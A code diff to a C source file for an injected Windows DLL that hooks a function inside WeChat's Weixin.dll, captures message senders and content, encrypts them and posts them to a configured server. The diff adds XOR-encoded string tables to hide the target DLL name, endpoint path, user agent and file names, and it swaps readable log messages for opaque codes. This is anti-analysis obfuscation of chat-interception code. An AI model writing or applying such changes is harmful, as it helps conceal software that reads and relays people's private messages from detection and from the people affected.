@@ -31,6 +31,21 @@ typedef __int64 (*target_fn)(void *, void *, size_t, int);
 
 static target_fn g_tramp = NULL;
 static void *g_target = NULL;
+
+#define XK 0x5B
+typedef struct{const unsigned char*p;int n;}xent;
+static const unsigned char x_cfg[]={62,58,40,34,54,52,53,4,51,52,52,48,117,56,61,60};
+static const unsigned char x_log[]={62,58,40,34,54,52,53,4,51,52,52,48,117,55,52,60};
+static const unsigned char x_wx[]={12,62,50,35,50,53,117,63,55,55};
+static const unsigned char x_ev[]={116,62,45,62,53,47,40,116,44,62,56,51,58,47};
+static const unsigned char x_aad[]={44,62,56,51,58,47,118,50,43,56,118,45,106};
+static const unsigned char x_ua[]={30,58,40,34,22,52,53,50,47,52,41,19,52,52,48,116,106,117,107};
+static const xent x_tbl[]={{x_cfg,16},{x_log,16},{x_wx,10},{x_ev,14},{x_aad,13},{x_ua,19}};
+enum{X_CFG,X_LOG,X_WX,X_EV,X_AAD,X_UA};
+static volatile unsigned char g_xk=XK;
+static const char*xs(int id){static char b[8][96];static int i=0;char*o=b[i++&7];const unsigned char* volatile p=x_tbl[id].p;int n=x_tbl[id].n;if(n>95)n=95;for(int k=0;k<n;k++)o[k]=(char)(p[k]^g_xk);o[n]=0;return o;}
+static const wchar_t*xw(int id){static wchar_t b[4][96];static int i=0;wchar_t*o=b[i++&3];const unsigned char* volatile p=x_tbl[id].p;int n=x_tbl[id].n;if(n>95)n=95;for(int k=0;k<n;k++)o[k]=(wchar_t)(p[k]^g_xk);o[n]=0;return o;}
+
 static FILE *g_log = NULL;
 
 static void logf_(const char *fmt, ...) {
@@ -67,9 +82,9 @@ static void load_cfg(void) {
     char path[MAX_PATH];
     DWORD n = GetTempPathA(MAX_PATH, path);
     if (!n) return;
-    strcat(path, "easymon_hook.cfg");
+    strcat(path, xs(X_CFG));
     FILE *f = fopen(path, "r");
-    if (!f) { logf_("没有配置文件 %s", path); return; }
+    if (!f) { logf_("C1 %s", path); return; }
     char line[256];
     while (fgets(line, sizeof(line), f)) {
         char *eq = strchr(line, '=');
@@ -84,7 +99,7 @@ static void load_cfg(void) {
     }
     fclose(f);
     g_ready = (strlen(g_keyhex) == 64);
-    logf_("配置 addr=%s key=%s", g_addr, g_ready ? "已加载" : "缺失");
+    logf_("C2 %s %s", g_addr, g_ready ? "1" : "0");
 }
 
 static int hex2bin(const char *hex, BYTE *out, int max) {
@@ -157,13 +172,13 @@ static void http_post(const char *body, int bodyLen) {
     if (colon) { *colon = 0; port = _wtoi(colon + 1); }
     wcscpy(host, waddr);
 
-    HINTERNET s = WinHttpOpen(L"EasyMonitorHook/1.0", WINHTTP_ACCESS_TYPE_NO_PROXY,
+    HINTERNET s = WinHttpOpen(xw(X_UA), WINHTTP_ACCESS_TYPE_NO_PROXY,
                               WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!s) return;
     HINTERNET c = WinHttpConnect(s, host, (INTERNET_PORT)port, 0);
     if (!c) { WinHttpCloseHandle(s); return; }
     wchar_t path[128];
-    swprintf(path, 128, L"/events/wechat?pid=%lu", GetCurrentProcessId());
+    swprintf(path, 128, L"%ls?pid=%lu", xw(X_EV), GetCurrentProcessId());
     HINTERNET r = WinHttpOpenRequest(c, L"POST", path, NULL, WINHTTP_NO_REFERER,
                                      WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
     if (r) {
@@ -173,7 +188,7 @@ static void http_post(const char *body, int bodyLen) {
         DWORD code = 0, sz = sizeof(code);
         WinHttpQueryHeaders(r, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                             WINHTTP_HEADER_NAME_BY_INDEX, &code, &sz, WINHTTP_NO_HEADER_INDEX);
-        logf_("上报 HTTP %lu (%d 字节)", code, bodyLen);
+        logf_("H1 %lu %d", code, bodyLen);
         WinHttpCloseHandle(r);
     }
     WinHttpCloseHandle(c);
@@ -248,14 +263,14 @@ static void send_payload(int type, const char *senderIn, const char *content, si
     unsigned long long reqId = ((unsigned long long)rand() << 32) ^ (unsigned long long)rand()
                                ^ ((unsigned long long)time(NULL) << 20);
     int aadLen = snprintf(aad, sizeof(aad),
-        "wechat-ipc-v1\ncallback\n/events/wechat\n%016llx\n%lu",
-        reqId, (unsigned long)time(NULL));
+        "%s\ncallback\n%s\n%016llx\n%lu",
+        xs(X_AAD), xs(X_EV), reqId, (unsigned long)time(NULL));
 
     BYTE *ct = malloc(plen + 16);
     int ctLen = 0;
     if (gcm_encrypt(key, 32, nonce, 12, (const BYTE *)aad, aadLen,
                     (const BYTE *)plain, plen, ct, &ctLen, tag) != 0) {
-        logf_("加密失败");
+        logf_("E1");
         free(plain); free(ct); return;
     }
 
@@ -369,11 +384,11 @@ static BOOL install(void) {
     const char *testAddr = getenv("EASYMON_TEST_TARGET");
     if (testAddr && *testAddr) {
         target = (BYTE *)(uintptr_t)strtoull(testAddr, NULL, 16);
-        logf_("自测模式 target=%p", target);
+        logf_("T0 %p", target);
     } else {
-        HMODULE wx = GetModuleHandleW(L"Weixin.dll");
+        HMODULE wx = GetModuleHandleW(xw(X_WX));
         if (!wx) {
-            logf_("Weixin.dll 未加载");
+            logf_("E2");
             return FALSE;
         }
         target = (BYTE *)wx + TARGET_RVA;
@@ -387,14 +402,14 @@ static BOOL install(void) {
     int isReplaced = cur[0] == 0x48 && cur[1] == 0xB8 && cur[10] == 0xFF && cur[11] == 0xE0;
 
     if (!isOrig && !isReplaced) {
-        logf_("序言不匹配，放弃 hook：%02x %02x %02x %02x %02x %02x",
+        logf_("E3 %02x %02x %02x %02x %02x %02x",
               cur[0], cur[1], cur[2], cur[3], cur[4], cur[5]);
         return FALSE;
     }
 
     DWORD old = 0;
     if (!VirtualProtect(target, PATCH_LEN, PAGE_EXECUTE_READWRITE, &old)) {
-        logf_("VirtualProtect 失败 %lu", GetLastError());
+        logf_("E4 %lu", GetLastError());
         return FALSE;
     }
 
@@ -402,13 +417,13 @@ static BOOL install(void) {
         // 别人已经 hook 过：先用磁盘序言恢复，避免我们的 trampoline 基于别人的跳转
         memcpy(target, kOrig, PATCH_LEN);
         FlushInstructionCache(GetCurrentProcess(), target, PATCH_LEN);
-        logf_("检测到已有 hook，已用原始序言覆盖");
+        logf_("I1");
     }
 
     g_tramp = (target_fn)build_trampoline(target);
     if (!g_tramp) {
         VirtualProtect(target, PATCH_LEN, old, &old);
-        logf_("trampoline 分配失败");
+        logf_("E5");
         return FALSE;
     }
 
@@ -421,7 +436,7 @@ static BOOL install(void) {
     FlushInstructionCache(GetCurrentProcess(), target, PATCH_LEN);
 
     VirtualProtect(target, PATCH_LEN, old, &old);
-    logf_("hook 已安装 target=%p tramp=%p", target, g_tramp);
+    logf_("I2 %p %p", target, g_tramp);
     return TRUE;
 }
 
@@ -430,10 +445,10 @@ static DWORD WINAPI init_thread(LPVOID param) {
     char path[MAX_PATH];
     DWORD n = GetTempPathA(MAX_PATH, path);
     if (n == 0 || n >= MAX_PATH - 32) return 0;
-    strcat(path, "easymon_hook.log");
+    strcat(path, xs(X_LOG));
     g_log = fopen(path, "a");
     if (!g_log) return 0;
-    logf_("DLL 已加载 pid=%lu", GetCurrentProcessId());
+    logf_("I3 %lu", GetCurrentProcessId());
     load_cfg();
     install();
     return 0;
@@ -446,7 +461,7 @@ static void uninstall(void) {
         memcpy(g_target, kOrig, PATCH_LEN);
         FlushInstructionCache(GetCurrentProcess(), g_target, PATCH_LEN);
         VirtualProtect(g_target, PATCH_LEN, old, &old);
-        logf_("hook 已卸载，序言已恢复");
+        logf_("I4");
     }
 }
 
